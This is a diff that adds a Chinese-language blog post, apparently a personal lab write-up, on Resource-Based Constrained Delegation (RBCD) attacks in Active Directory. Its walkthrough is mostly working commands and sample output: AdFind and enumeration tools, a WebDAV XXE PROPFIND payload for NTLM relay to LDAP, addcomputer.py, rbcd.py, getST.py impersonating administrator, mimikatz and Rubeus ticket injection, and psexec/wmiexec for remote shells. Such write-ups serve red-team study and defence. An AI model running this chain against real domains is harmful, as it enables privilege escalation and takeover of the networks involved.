@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      基于资源的约束委派 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">基于资源的约束委派</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-04-16 21:36:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>梳理RBCD相关攻击思路的笔记</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考<a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
+<blockquote>
+<p>为了配置受约束的委派，必须拥有SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员。为了使用户&#x2F;资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p>
+</blockquote>
+<blockquote>
+<p>非约束委派和普通的约束委派都是”正向的”，通过修改服务A属性”msDS-AllowedToDelegateTo”，添加服务B的SPN(Service Prinvice Name)，设置约束委派对象(服务B)，服务A便可以模拟用户向域控制器请求服务B以获得服务票据(TGS)来使用服务B的资源。</p>
+<p>而基于资源的约束委派则相反，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。</p>
+</blockquote>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220417014100036.png" alt="image-20220417014100036"></p>
+<p>总而言之，基于资源的约束委派(RBCD)是由我们要攻击的目标机器发起配置，只要我们能修改目标机器msDS-AllowedToActOnBehalfOfOtherIdentity属性(特权用户或者目标机器用户本身)，就可以做RBCD攻击。</p>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="找到可以打RBCD的域内机器"><a href="#找到可以打RBCD的域内机器" class="headerlink" title="找到可以打RBCD的域内机器"></a>找到可以打RBCD的域内机器</h3><h4 id="将机器加入域的用户"><a href="#将机器加入域的用户" class="headerlink" title="将机器加入域的用户"></a>将机器加入域的用户</h4><p>参考A-team文章可以知道将机器加域的用户对机器具有<code>WriteProperty</code>权限，所以能修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，可以用于打RBCD。</p>
+<h5 id="FindUser"><a href="#FindUser" class="headerlink" title="FindUser"></a>FindUser</h5><p>参考<a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#%E6%96%B0%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2-ms-ds-creatorsid">A-team师傅文章里的代码</a>改一个查域内计算机”mS-DS-CreatorSID”属性的工具</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220416175604127.png" alt="image-20220416175604127"></p>
+<h5 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h5><p>如果当前机器不在域内，可以用-u指定用户名，-up指定密码使用AdFind.exe</p>
+<p>查找域内机器的mS-DS-CreatorSID属性，可用-h指定具体机器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=copora,DC=info&quot;</span> -f <span class="string">&quot;objectClass=computer&quot;</span> mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220416184249179.png" alt="image-20220416184249179"></p>
+<p>查找sid为S-1-5-21-2500253843-3596113865-3519008895-1109的用户是谁</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=copora,DC=info&quot; -f &quot;(&amp;(objectsid=S-1-5-21-2500253843-3596113865-3519008895-1109))&quot; objectclass cn dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220416184230922.png" alt="image-20220416184230922"></p>
+<h4 id="特权ACL账户"><a href="#特权ACL账户" class="headerlink" title="特权ACL账户"></a>特权ACL账户</h4><p>对机器有<code>WriteDacl</code> <code>GenericAll</code>  <code>GenericWrite</code> <code>WriteOwner</code> <code>WriteProperty</code>等写权限ACL的用户可以用于域内横向打RBCD，因为有这些ACL就有证明该用户能修改目标计算机的账户属性，即可以配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性。</p>
+<h5 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h5><p>sharphound容易被杀软干，免杀就参考<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">源代码</a>自己各显神通吧</p>
+<h5 id="Get-RBCD-Threaded"><a href="#Get-RBCD-Threaded" class="headerlink" title="Get-RBCD-Threaded"></a>Get-RBCD-Threaded</h5><p><a target="_blank" rel="noopener" href="https://github.com/FatRodzianko/Get-RBCD-Threaded">https://github.com/FatRodzianko/Get-RBCD-Threaded</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-RBCD-Threaded.exe -s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220417003852930.png"></p>
+<p>发现Zhu5对LIGANG_PC具有<code>GenericWrite</code>权限，可以打RBCD</p>
+<h3 id="配合relay攻击"><a href="#配合relay攻击" class="headerlink" title="配合relay攻击"></a>配合relay攻击</h3><p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/">A-team师傅文章</a>里面介绍了一个基于WEBDAV结合NTLM relay到ldap去设置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性实现RBCD的案例。</p>
+<p>只要我们能拿到利用目标机器用户发起的一个带域身份认证信息的http请求，我们就能httprelay2ldap到域控配置基于资源的约束委派。即在NTLM发起者属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>里面添加一条ace，可以让任何机器用户和服务用户可以控制该用户(NTLM发起者)，在这里可能需要新增一台Computer账号或者控制一台机器(主要是需要一个spn用户)。</p>
+<p>RBCD+Relay既可以用于烂番茄域内本地提权，也可以用于配合一些ssrf漏洞等relay2ldap在域内实现rce。</p>
+<h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><p>即烂番茄(Rotten Tomato)，A-team师傅翻阅<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities">官方文档</a>发现<strong>iis用户请求网络资源时用的是<code>当前机器账户</code>身份请求的</strong>，显然我们可以利用这个特性，relay2ldap给配置RBCD，且师傅们进一步发现所有<strong>低权限服务(例如network service这类型的本机服务)如果可以请求域资源，那么出网都是以机器账户身份去请求</strong>的。</p>
+<h4 id="relay-rbcd实现rce"><a href="#relay-rbcd实现rce" class="headerlink" title="relay+rbcd实现rce"></a>relay+rbcd实现rce</h4><p>本地搭建一个webdav的环境(建议用<a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-5/v5.5.12/bin/">tomcat5</a>测，因为tomcat5自带webdav，高版本自己配出来都是修复过的webdav..很坑)模拟A-team文章中的环境操作。</p>
+<p>添加机器用户test002</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py -computer-name <span class="string">&#x27;test001$&#x27;</span> -computer-pass 1qaz@WSX -dc-ip 172.16.64.141 copora.info/liming:<span class="string">&#x27;!QAZ2wsx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>开启ntlmrelayx监听，监听到后会自动配一个从test002$用户到目标的rbcd</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ntlmrelayx.py  -t ldap://172.16.64.141 -debug  -ip 172.16.64.192 --delegate-access --escalate-user test001\$</span><br></pre></td></tr></table></figure>
+
+<p>触发webdav的xxe</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PROPFIND</span> <span class="string">/webdav</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.33.33:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>247</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">propertyupdate</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">loot</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://172.16.64.1/&quot;</span>&gt;</span> ]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">D:propertyupdate</span> <span class="attr">xmlns:D</span>=<span class="string">&quot;DAV:&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">D:set</span>&gt;</span><span class="tag">&lt;<span class="name">D:prop</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://172.16.64.1/&quot;</span>&gt;</span><span class="symbol">&amp;loot;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">D:prop</span>&gt;</span><span class="tag">&lt;/<span class="name">D:set</span>&gt;</span><span class="tag">&lt;/<span class="name">D:propertyupdate</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418183840986.png" alt="image-20220418183840986"></p>
+<p>收到请求</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418180719192.png" alt="image-20220418180719192"></p>
+<p>webdav默认是system权限发起http请求，即用当前机器的机器账号发起http请求，则把webdav的http请求通过relay2ldap到域控配一个从新增的机器用户test001到webdav机器用户本身的基于资源的约束委派。</p>
+<p>配好rbcd后可以直接用机器用户test001申请访问webdav机器的cifs票据</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#申请cifs票据</span></span><br><span class="line">python getST.py -dc-ip 172.16.64.141 APPLE/test001\$:1qaz@WSX -spn cifs/IISSERVER\$.copora.info -impersonate administrator</span><br><span class="line"><span class="comment">#导入票据</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_IISSERVER.copora.info@COPORA.INFO.ccache</span><br></pre></td></tr></table></figure>
+
+<p>或windows用</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc administrator@cifs_IISSERVER.copora.info@COPORA.INFO.ccache&quot; <span class="keyword">exit</span></span><br><span class="line">#然后psexec</span><br><span class="line">psexec \\IISSERVER <span class="built_in">cmd</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418183652708.png" alt="image-20220418183652708"></p>
+<h3 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h3><p>当用户对机器具有<code>WriteDacl</code> <code>GenericAll</code>  <code>GenericWrite</code> <code>WriteOwner</code> <code>WriteProperty</code>等权限时，可以用该用户对有权限的机器做内网横向移动。</p>
+<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这里我环境中用户liming对LIGANG_PC有ACL的写权限，这里复现一下打法。</p>
+<p>添加机器用户evilcomputer$(本质是需要一个spn，因为创建机器用户会顺带创建spn，所以一般都是用一个域账号创建机器账号做操作。)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py -computer-name <span class="string">&#x27;evilcomputer$&#x27;</span> -computer-pass ev1lP@sS -dc-ip 172.16.64.141 copora.info/liming:<span class="string">&#x27;!QAZ2wsx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220417015026423.png" alt="image-20220417015026423"></p>
+<p>给机器用户EVILCOMPUTER赋予对机器LIGANG_PC的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rbcd.py -f EVILCOMPUTER -t LIGANG_PC -dc-ip 172.16.64.141 copora.info\\liming:<span class="string">&#x27;!QAZ2wsx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220417015410349.png" alt="image-20220417015410349"></p>
+<p>现在已经用EVILCOMPUTER配置好了对LIGANG_PC的RBCD，后续只需触发S4U获取票据即可。</p>
+<h5 id="getST-py"><a href="#getST-py" class="headerlink" title="getST.py"></a>getST.py</h5><p>用机器用户EVILCOMPUTER模拟administrator用户申请对机器WEB(这里的机器名必须跟上域名)的cifs服务票据</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 172.16.64.141 copora.info/EVILCOMPUTER\$:<span class="string">&#x27;ev1lP@sS&#x27;</span> -spn cifs/LIGANG_PC.copora.info -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p>或者用hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -hashes 30a7b270355d67451970d37ff1c9b666:513A2A680EF339A879A76D7BA6005D3B -spn cifs/LIGANG_PC.copora.info copora.info/EVILCOMPUTER$  -impersonate administrator -dc-ip 172.16.64.141</span><br></pre></td></tr></table></figure>
+
+<h6 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h6><p>注入.ccache后缀的票据</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptc administrator@cifs_LIGANG_PC.copora.info@COPORA.INFO.ccache&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418113949066.png" alt="image-20220418113949066"></p>
+<p>然后就可以随便玩了</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418114021869.png" alt="image-20220418114021869"></p>
+<h6 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=xxxx.ccache</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<p>注入票据后可以直接wmi或者psexec</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -no-pass -k LIGANG_PC.copora.info -dc-ip 172.16.64.141</span><br><span class="line">python smbexec.py -no-pass -k LIGANG_PC.copora.info -dc-ip 172.16.64.141</span><br><span class="line">python psexec.py -no-pass -k LIGANG_PC.copora.info -dc-ip 172.16.64.141</span><br></pre></td></tr></table></figure>
+
+<p>导入票据</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=xxxxx/admin.ccache</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<h5 id="Rebus"><a href="#Rebus" class="headerlink" title="Rebus"></a>Rebus</h5><p>Rebeus默认只支持hash，所以先把明文换成hash</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:EVILCOMPUTER /password:ev1lP@sS /domain:copora.info</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220417233610926.png" alt="image-20220417233610926"></p>
+<p>这里直接s4u协议申请一个对LIGANG_PC的cifs白银票据，并注入到当前机器</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:EVILCOMPUTER$ /rc4:<span class="number">513</span>A2A680EF339A879A76D7BA6005D3B /impersonateuser:administrator /msdsspn:cifs/LIGANG_PC.copora.info /ptt</span><br></pre></td></tr></table></figure>
+
+<p>注意这里cifs的票据我本地测出来得用fqdn的格式指定msdsspn，否则dir没效果</p>
+<p>直接用cifs&#x2F;LIGANG_PC报错</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418142208959.png" alt="image-20220418142208959"></p>
+<p>换成fqdn的格式就可以正常dir了</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418142126111.png" alt="image-20220418142126111"></p>
+<h6 id="执行psexec的坑点"><a href="#执行psexec的坑点" class="headerlink" title="执行psexec的坑点"></a>执行psexec的坑点</h6><p>但是这样还不够，网上很多文章提到这里直接用cifs票据只能dir不能执行psexec，我这里复现了一下也是这样</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418142340897.png" alt="image-20220418142340897"></p>
+<p>要执行psexec还需要额外申请一张host的票据</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:EVILCOMPUTER$ /rc4:<span class="number">513</span>A2A680EF339A879A76D7BA6005D3B /impersonateuser:administrator /msdsspn:host/LIGANG_PC /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418142533258.png" alt="image-20220418142533258"></p>
+<p>申请host票据后直接psexec就可以了</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\LIGANG_PC <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+
+<p>经过我进一步测试，我发现机器上域内的用户用这个cifs票据才会psexec失败。而机器上的本地用户其实可以只用rebeus申请的cifs票据执行psexec</p>
+<p><img src="/2022/08/16/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220418143736276.png" alt="image-20220418143736276"></p>
+<p>抓包暂时没看出来有啥区别，后面有缘再研究</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/15/%E4%B8%80%E6%AC%A1fastjson%E7%BB%95waf%E6%A1%88%E4%BE%8B/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-04-16 21:36:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/04/16/%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%80%E6%9E%9A/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">利用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E6%89%93RBCD%E7%9A%84%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8"><span class="toc-text">找到可以打RBCD的域内机器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E6%9C%BA%E5%99%A8%E5%8A%A0%E5%85%A5%E5%9F%9F%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text">将机器加入域的用户</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#FindUser"><span class="toc-text">FindUser</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Adfind"><span class="toc-text">Adfind</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%9D%83ACL%E8%B4%A6%E6%88%B7"><span class="toc-text">特权ACL账户</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Bloodhound"><span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Get-RBCD-Threaded"><span class="toc-text">Get-RBCD-Threaded</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88relay%E6%94%BB%E5%87%BB"><span class="toc-text">配合relay攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#relay-rbcd%E5%AE%9E%E7%8E%B0rce"><span class="toc-text">relay+rbcd实现rce</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">域内横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-text">实操</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getST-py"><span class="toc-text">getST.py</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#linux"><span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Rebus"><span class="toc-text">Rebus</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cpsexec%E7%9A%84%E5%9D%91%E7%82%B9"><span class="toc-text">执行psexec的坑点</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
